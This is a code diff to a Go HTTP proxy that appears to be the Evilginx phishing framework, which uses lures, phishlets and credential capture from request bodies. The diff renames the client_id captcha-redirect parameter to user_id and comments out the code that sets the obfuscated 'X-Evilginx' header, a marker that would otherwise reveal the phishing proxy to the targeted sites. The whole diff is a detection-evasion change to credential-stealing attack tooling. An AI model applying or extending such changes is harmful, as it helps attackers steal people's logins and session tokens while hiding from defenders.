@@ -164,20 +164,20 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	// Regular expression to detect turnstile requests
 	urlPattern := regexp.MustCompile(`/validate-captcha`)
 
-	// Only intercept /validate-captcha requests containing client_id
+	// Only intercept /validate-captcha requests containing user_id
 	p.Proxy.OnRequest(goproxy.UrlMatches(urlPattern)).DoFunc(
 		func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
-			// Check if the query string contains the client_id parameter
-			clientID := req.URL.Query().Get("client_id")
+			// Check if the query string contains the user_id parameter
+			clientID := req.URL.Query().Get("user_id")
 			if clientID != "" {
-				//fmt.Println("URL matches pattern, client_id found:", clientID)
+				//fmt.Println("URL matches pattern, user_id found:", clientID)
 				// Modify the request to forward it to the local server
 				req.URL.Scheme = "http"
 				req.URL.Host = "localhost:80"
 				// Forward the modified request
 				return req, nil
 			}
-			// If client_id is not present or not needed, you can decide how to handle this case.
+			// If user_id is not present or not needed, you can decide how to handle this case.
 			// For example, return the request unmodified, modify it in some other way, or even return a custom response.
 			return req, nil
 		},
@@ -232,7 +232,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
-			o_host := req.Host  // Removing X-Evilginx header reporting
+		
+    
+    
+    //  o_host func
+    //	o_host := req.Host  
+    
+    
+    
 			lure_url := req_url
 			req_path := req.URL.Path
 			if req.URL.RawQuery != "" {
@@ -329,7 +336,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				req_ok := false
 				// handle session
 				if p.handleSession(req.Host) && pl != nil {
-					l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
+					l, err := p.cfg.GetLureByPath(pl_name, req_path)
 					if err == nil {
 						log.Debug("triggered lure for path '%s'", req_path)
 					}
@@ -509,7 +516,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-				req.Header.Set(p.getHomeDir(), o_host)
+			
+      
+      
+      //o_host func
+      // req.Header.Set(p.getHomeDir(), o_host)
+      
+      
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
@@ -523,7 +536,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 							}
 						}
-						l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
+						l, err := p.cfg.GetLureByPath(pl_name, req_path)
 						if err == nil {
 							// show html redirector if it is set for the current lure
 							if l.Redirector != "" {
@@ -629,7 +642,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// redirect to login page if triggered lure path
 				if pl != nil {
-					_, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
+					_, err := p.cfg.GetLureByPath(pl_name, req_path)
 					if err == nil {
 						// redirect from lure path to login url
 						rurl := pl.GetLoginUrl()
@@ -712,7 +725,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
-					req.Header.Set(p.getHomeDir(), o_host)
+					
+          
+          //o_host func
+          // req.Header.Set(p.getHomeDir(), o_host)
+          
+          
+          
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -1412,7 +1431,7 @@ func (p *HttpProxy) trackerImage(req *http.Request) (*http.Request, *http.Respon
 func (p *HttpProxy) redirectTurnstile(req *http.Request, rid string) (*http.Request, *http.Response) {
 	resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 	if resp != nil {
-		redirect_url := "https://" + req.Host + "/validate-captcha?client_id=" + rid
+		redirect_url := "https://" + req.Host + "/validate-captcha?user_id=" + rid
 		resp.Header.Add("Location", redirect_url)
 		return req, resp
 	}
@@ -1910,9 +1929,18 @@ func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 	return "", false
 }
 
-func (p *HttpProxy) getHomeDir() string {
-	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
-}
+
+
+
+//x-E Header function
+//func (p *HttpProxy) getHomeDir() string {
+//	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
+//}
+
+
+
+
+
 
 func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
 	for site, pl := range p.cfg.phishlets {
